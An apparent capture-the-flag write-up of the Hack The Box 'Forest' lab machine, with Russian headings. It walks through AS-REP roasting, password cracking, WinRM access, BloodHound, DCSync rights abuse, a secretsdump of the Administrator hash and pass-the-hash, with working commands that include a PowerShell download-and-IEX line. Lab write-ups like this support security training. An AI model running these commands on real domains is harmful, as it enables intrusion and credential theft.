---
title: "[HTB] Forest"
permalink: /writeups/htb/forest/
excerpt: "Краткий разбор машины Forest с Hack The Box."
tags:
  - hackthebox
  - htb
  - activedirectory
  - pentest
  - writeup
  - bloodhound
  - asreproast
  - winrm
---

---

{% include toc icon="cog" title="Forest Solution" %}

The [Forest](https://app.hackthebox.com/machines/Forest) machine has been created by [egre55](https://app.hackthebox.com/users/1190) and [mrb3n](https://app.hackthebox.com/users/2984). This is an **easy** Windows Machine with a strong focus on Active Directory exploitation. Here, some knowledge about AD and being able to read a Bloodhound graph should be enough to clear the box.

If you didn't solve this challenge and just look for answers, first, you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints about interesting attack paths when dealing with an Active Directory.
{: .text-justify}

![image-center](/images/htb/htb_forest_infocard.png){: .align-center}

**Заметка:** Все действия против целевой машины выполнялись со стандартной системой *Kali Linux*. Скачать Kali можно с официального сайта [здесь](https://www.kali.org/).
{: .notice--info}

# Разведка

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Сканирование Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/). Note the **-sV** switch which enables *version detection* and allows Nmap to check its internal database to try to determine the service protocol, application name and version number.

**Заметка:** После запуска HTB-машины всегда подожди несколько минут, чтобы убедиться, что все сервисы поднялись корректно. Если просканировать машину сразу, можно пропустить порты, которые должны быть открыты.
{: .notice--info}

```bash
$ nmap -sV 10.129.95.210 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-14 15:50 EST
Nmap scan report for 10.129.95.210
Host is up (0.022s latency).
Not shown: 990 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-02-14 20:57:56Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.82 seconds
```

**Помни:** По умолчанию **Nmap** сканирует 1000 самых распространенных TCP-портов на целевых хостах. Если нужно сканировать больше портов или изменить поведение по умолчанию, обязательно прочитай [документацию](https://nmap.org/docs.html).
{: .notice--warning}

As we can see, the machine seems to be a domain controller for **htb.local**. We also have a few interesting open services including **LDAP** (389/TCP) and **SMB** (445/TCP). 

Now, we need more information, like usernames. With usernames, we would be able to go further and executes attacks like brute force, password spraying, etc.

## RPCBind

According to this [Pentesting Cheatsheet](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets#rpc-netbios-smb), we could try to establish a **null session** using the [rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html). This tool provides a some intersing command to execute remote procedure calls, including a way to enumerate some users.

**Заметка:** Microsoft Remote Procedure Call (MS-RPC) defines a powerful technology for creating distributed client/server programs. It is quite complex, but there are lots of [documentation](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page) online if you want to dig a bit further.
{: .notice--info}

As per the name, a null session does not require any username or password to get information about the remote host. So, let's prepare the **rpcclient** command with no username (`-U ""`), no password (`-N`) and the command to run in order to enumerate domain users (`-c enumdomusers`).

```bash
$ rpcclient -U "" -N -c enumdomusers 10.129.95.210 
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

Nice, it seems to be working. Note that, we have a few users starting with *HealthMailbox* and *SM_* which are related to [Microsoft Exchange](https://techcommunity.microsoft.com/t5/exchange-team-blog/exchange-2013-2016-monitoring-mailboxes/ba-p/611004) and can be ignored here.

Another way to enumerate users would be with [ldapsearch](https://linux.die.net/man/1/ldapsearch) and the LDAP (TCP/389) port.

```bash
$ ldapsearch -x -b "dc=htb,dc=local" "*" -H ldap://10.129.110.245 | grep userPrincipalName

...[snip]...

userPrincipalName: sebastien@htb.local
userPrincipalName: santi@htb.local
userPrincipalName: lucinda@htb.local
userPrincipalName: andy@htb.local
userPrincipalName: mark@htb.local
```

`ldapsearch` is a really nice tool to open a connection to an LDAP server and performs targeted searches.

# Первичный доступ

Now, we do have a list of valid usernames and we could perform different [brute force](https://attack.mitre.org/techniques/T1110/) attacks against these accounts. However, it could be time consuming and we don't have any information about the domain's password policy and lockout threshold. Let's stay on the safe side for now, there is an attack called [AS-REP Roasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat) which could be used against the users.

## ASREPRoast

As a reminder, AS-REP roasting is a technique that allows retrieving password hashes for users that have the **"Do not require Kerberos preauthentication"** property selected. Indeed, if a user does not have Kerberos pre-authentication enabled, an AS-REP can be requested for that user, and part of the reply can be cracked offline to recover their plaintext password.

One of the best tools for the job would be [impacket-GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py), which can list and get TGTs for the users that have the property set to **UF_DONT_REQUIRE_PREAUTH**, it should already be installed on Kali. Note that the **user.txt** file contains the list of the previously recovered account.

```bash
$ impacket-GetNPUsers htb.local/ -usersfile user.txt -dc-ip 10.129.95.210  
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:617958fe87802133461a4ead4b697b5d$d999599f5812fc7e7b80db85e55cff57cd6a2091b84f97300d97d9faf09cc184c0a7e51cdd0b11bd21ac4423876c97bcf4f5b934f85cde4af8e2fc81d33988297de7ee195d1c6582b9ff202497f9e580ea709d524de279fad1b81f318fe473acf5e505db0c550d026d64b4bfe011eccc0d6d19f2dd894608a0db3ddb4941d71fccb9043da894a7ab579b3f5fc7b6972daa0d25e732c192281fd2fc2987f0f9059d7f777e76ecbff880e4ecc1044b190f829f1b3a90e0a85dee92008da27dcda65d77df67990cfc81b1ae3fda2f8722ba3aa7f6291ad2cd49db59f47bb6bdd7ab690833c9666a
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Nice, we have a hash for the **svc-alfresco** user. Now, we'll try to crack it and see if we can get some kind of access to the remote computer.

## Взлом пароля

You just have to copy/paste the following hash in a file and try to crack it offline using the *rockyou* (or any other list) passwords list (if you are using Kali Linux, it should be present in the `/usr/share/wordlists/` folder). 

```text
$krb5asrep$23$svc-alfresco@HTB.LOCAL:617958fe87802133461a4ead4b697b5d$d999599f5812fc7e7b80db85e55cff57cd6a2091b84f97300d97d9faf09cc184c0a7e51cdd0b11bd21ac4423876c97bcf4f5b934f85cde4af8e2fc81d33988297de7ee195d1c6582b9ff202497f9e580ea709d524de279fad1b81f318fe473acf5e505db0c550d026d64b4bfe011eccc0d6d19f2dd894608a0db3ddb4941d71fccb9043da894a7ab579b3f5fc7b6972daa0d25e732c192281fd2fc2987f0f9059d7f777e76ecbff880e4ecc1044b190f829f1b3a90e0a85dee92008da27dcda65d77df67990cfc81b1ae3fda2f8722ba3aa7f6291ad2cd49db59f47bb6bdd7ab690833c9666a
```

Here, we used [John the Ripper](https://github.com/openwall/john) to crack the password, but it can be done with other tools.

```bash
$ john hash.txt -w=/usr/share/wordlists/rockyou.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:06 DONE (2022-02-04 13:50) 0.1600g/s 653721p/s 653721c/s 653721C/s s401447401447401447..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Great, we now have credentials for **svc-alfresco** (`svc-alfresco:s3rvice`). Note that if you do have **hashcat** installed, you can also try the following command: `hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt`. 

Using another awesome tool, [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), we can check if the user's password is valid.

```bash
$ crackmapexec smb 10.129.95.210 -u svc-alfresco -p s3rvice -d htb.local
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.95.210   445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
```

Awesome, we have credentials for the **svc-alfresco** domain account (`svc-alfresco:s3rvice`).

## Доступ по WinRM

Now, instead of using the SMB (TCP/445) protocol with `crackmapexec`, let's try to use WinRM (TCP/5985) and see if we have a remote access.

```bash
$ crackmapexec winrm 10.129.95.210 -u svc-alfresco -p s3rvice -d htb.local
HTTP        10.129.95.210   5985   10.129.95.210    [*] http://10.129.95.210:5985/wsman
WINRM       10.129.95.210   5985   10.129.95.210    [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

As we can see the **svc-alfresco** can *PS-Remote* to **forest.htb.local**. [PS-Remote](https://book.hacktricks.xyz/pentesting/5985-5986-pentesting-winrm) means we can use WinRM, a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP, to remotely administer the machine from PowerShell.

**Заметка:** Порты WinRM (5985/TCP и 5986/TCP) не появились при сканировании машины, но на самом деле они открыты. Причина снова в том, что по умолчанию Nmap сканирует только 1000 самых распространенных TCP-портов, а порты WinRM, вероятно, не входят в этот набор.
{: .notice--info}

From a Linux machine, we can use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm), a Ruby tool that implements Microsoft WS-Management Protocol, and the recovered account to connect to the remote machine.

```bash
$ evil-winrm -i 10.129.95.210 -u svc-alfresco  -p s3rvice 
Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir ../Desktop


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         2/4/2022   9:24 AM             34 user.txt
```

Nice, we have a remote shell access and the **first flag**.


# Повышение привилегий

According to the MITRE, [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/) consists of techniques that adversaries use to gain higher-level permission on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permission to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

Let's start with Active Directory reconnaissance to see if we can find an attack path.

## Разведка Active Directory

With a valid account, we can now use one of the [BloodHound](https://github.com/BloodHoundAD/BloodHound) ingestors and gather more information about the Active Directory. BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment. 

Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Here, we used a Python based ingestor for BloodHound, [BloodHound.py](https://github.com/fox-it/BloodHound.py).

```bash
$ bloodhound-python -c All -u svc-alfresco -p s3rvice -d htb.local -ns 10.129.95.210 --zip
INFO: Found AD domain: htb.local
INFO: Connecting to LDAP server: FOREST.htb.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: FOREST.htb.local
WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
INFO: Found 31 users
INFO: Found 75 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: EXCH01.htb.local
INFO: Querying computer: FOREST.htb.local
INFO: Done in 00M 09S
INFO: Compressing output into 20220204141002_bloodhound.zip
```

Now, you can import the generated file (*20220204141002_bloodhound.zip*) in BloodHound by running `sudo neo4j start`, then execute BloodHound in another terminal with the `bloodhound` command.

## Получение привилегий администратора

It's time to elevate our privileges and get an administrator access. Back to *BloodHound*, we can see that our user, **svc-alfresco**, is a member of the **"Account Operators"** group which has *GenericAll* permission on the **"Exchange Windows Permissions"** group. 

With [GenericAll](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) permission, we have full rights to the targeted object (add users to a group, reset user's password, etc.) and we can abuse this weak permission.

![image-center](/images/htb/htb_forest_bloodhound_02.png){: .align-center}

Moreover, the **"Exchange Windows Permissions"** does have *WriteDACL* permission on the Domain (*htb.local*). It means that if we create a user and add it to the **"Exchange Windows Permissions"** group, we could give him [DCSync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync) access rights and dump domain controller password hashes.

So, we have four (4) things to do :
- Create a user
- Add it to the **"Exchange Windows Permission"s** group
- Add it to the **"Remote Management Users"** group (to have remote access rights)
- Abuse weak permission on DACLs to get **DCSync** rights

First, the user and groups attribution. 

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user ax Qwerty1! /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" ax /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" ax /add
The command completed successfully.
```

Seems good, let's check if the new user is working.

```bash
$ crackmapexec smb 10.129.95.210 -u ax -p 'Qwerty1!' -d htb.local
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.95.210   445    FOREST           [+] htb.local\ax:Qwerty1! 
```

Perfect! Now, to abuse the DACL, we used a well-known PowerShell that aims to gain network situational awareness on Windows domains, [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1). Note that we used the local **Apache** service on Kali to host the file and download it from the remote machine.

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> (New-Object System.Net.WebClient).DownloadString('http://10.10.14.xx/PowerView.ps1') | IEX
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPass = ConvertTo-SecureString 'Qwerty1!' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\ax', $SecPass)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-ObjectACL -PrincipalIdentity ax -Credential $Cred -Rights DCSync
```

Now that **ax** have *DCSync* permission, we should be able to dump users hashes from the domain controller.

## Дамп хэша администратора

Here, we used [impacket-secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py), another tool from the *Impacket* suite to dump the **Administrator** password.

Note the `-just-dc-user` switch that extract only NTDS.DIT data for the user specified and the `just-dc-ntlm` that extract only NTDS.DIT data (NTLM hashes only).

```bash
$ impacket-secretsdump htb.local/ax@10.129.95.210 -just-dc-user Administrator -just-dc-ntlm
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
[*] Cleaning up... 
```

Then, we can use this NTLM hash with `crackmapexec` to perform a *Pass the Hash* attack and read the **second flag** from the domain controller.

Note that **Pass the hash** (or *PtH*) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.

```bash                        
$ crackmapexec smb 10.129.95.210 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -d htb.local -x "dir C:\Users\Administrator\Desktop" 
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.95.210   445    FOREST           [+] htb.local\Administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
SMB         10.129.95.210   445    FOREST           [+] Executed command 
SMB         10.129.95.210   445    FOREST           Volume in drive C has no label.
SMB         10.129.95.210   445    FOREST           Volume Serial Number is 61F2-A88F
SMB         10.129.95.210   445    FOREST           
SMB         10.129.95.210   445    FOREST           Directory of C:\Users\Administrator\Desktop
SMB         10.129.95.210   445    FOREST           
SMB         10.129.95.210   445    FOREST           09/23/2019  01:15 PM    <DIR>          .
SMB         10.129.95.210   445    FOREST           09/23/2019  01:15 PM    <DIR>          ..
SMB         10.129.95.210   445    FOREST           02/04/2022  09:24 AM                34 root.txt
SMB         10.129.95.210   445    FOREST           1 File(s)             34 bytes
SMB         10.129.95.210   445    FOREST           2 Dir(s)  10,443,857,920 bytes free
```

Awesome! I hope you enjoyed it, I know I did :)
